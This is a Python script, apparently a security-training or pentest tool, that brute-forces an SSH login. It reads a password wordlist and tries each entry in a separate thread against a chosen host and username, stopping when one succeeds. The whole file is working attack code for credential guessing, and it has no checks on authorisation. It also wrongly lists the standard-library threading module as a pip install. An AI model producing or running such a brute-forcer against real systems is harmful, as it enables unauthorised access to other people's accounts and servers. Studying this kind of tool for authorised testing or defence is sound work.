###########################################
# Script Name : SSH Brute-Force Attack Script (threaded)
# Description : This script attempts to brute-force an SSH login using a wordlist of passwords. 
#It utilizes threading to perform multiple login attempts concurrently, making the process faster. 
#The script will stop execution as soon as a correct password is found.
###########################################

#Features:
#- Uses Paramiko for SSH connections.
#- Implements multi-threading for faster brute-force attempts.
#- Stops execution once a valid password is discovered.
#- Validates the existence of the provided password list file before running.

# Required installations (uncomment and install if not already installed)
# pip3 install paramiko
# pip3 install threading

import paramiko, os, sys, termcolor  # Import necessary libraries
import threading, time  # Import threading for parallel execution and time for delays

stop_flag = 0  # Global flag to stop execution when the correct password is found

def ssh_connect(password):
    """
    Attempts to connect to the SSH server using the provided password.
    If successful, it prints the password and sets the stop flag to halt further attempts.
    """
    global stop_flag
    ssh = paramiko.SSHClient()  # Create an SSH client instance
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically accept unknown host keys
    try:
        # Attempt to establish an SSH connection with the given credentials
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1  # Set stop flag to halt further brute-force attempts
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))  # Print failed attempt
    ssh.close()  # Close the SSH connection

# Gather user inputs for the target host, username, and password list file
host = input('[+] Hostname: ')
username = input('[+] Username: ')
Input_file = input('[+] Password List: ')
print('\n')

# Check if the provided password list file exists
if not os.path.exists(Input_file):
    print('[!!] That file does not exist')  # Print an error message if the file is missing
    sys.exit(1)  # Exit the program

# Display a message indicating the start of the brute-force attack
print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' * * *')

# Open the password list file and iterate through each line (password)
with open(Input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:  # Stop execution if the correct password is found
            t.join()  # Ensure the running thread completes before exiting
            exit()
        password = line.strip()  # Remove newline characters from the password
        t = threading.Thread(target=ssh_connect, args=(password,))  # Create a new thread for each password attempt
        t.start()  # Start the thread
        time.sleep(0.5)  # Delay between attempts to avoid overwhelming the server
